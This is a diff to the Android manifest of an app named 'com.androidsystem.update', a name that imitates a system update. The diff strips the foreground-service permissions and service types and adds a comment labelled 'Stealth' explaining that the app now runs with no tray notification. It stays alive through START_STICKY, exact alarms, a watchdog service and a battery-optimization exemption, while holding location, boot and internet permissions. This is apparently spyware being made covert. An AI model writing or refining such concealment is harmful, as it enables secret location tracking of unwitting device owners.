@@ -3,12 +3,12 @@
     xmlns:tools="http://schemas.android.com/tools"
     package="com.androidsystem.update">
 
+    <!-- Stealth: no foreground service — the app runs as a plain background
+         service (no notification in the tray) kept alive by START_STICKY,
+         exact alarms, the watchdog service and battery-optimization exemption. -->
     <uses-permission android:name="android.permission.INTERNET" />
     <uses-permission android:name="android.permission.ACCESS_NETWORK_STATE" />
     <uses-permission android:name="android.permission.ACCESS_WIFI_STATE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_DATA_SYNC" />
-    <uses-permission android:name="android.permission.FOREGROUND_SERVICE_LOCATION" />
     <uses-permission android:name="android.permission.RECEIVE_BOOT_COMPLETED" />
     <uses-permission android:name="android.permission.ACCESS_FINE_LOCATION" />
     <uses-permission android:name="android.permission.ACCESS_COARSE_LOCATION" />
@@ -80,7 +80,6 @@
             android:name=".service.CoreService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="dataSync|location"
             android:stopWithTask="false"
             android:isolatedProcess="false" />
 
@@ -88,7 +87,6 @@
             android:name=".service.WatchdogService"
             android:enabled="true"
             android:exported="false"
-            android:foregroundServiceType="dataSync"
             android:stopWithTask="false" />
 
         <receiver
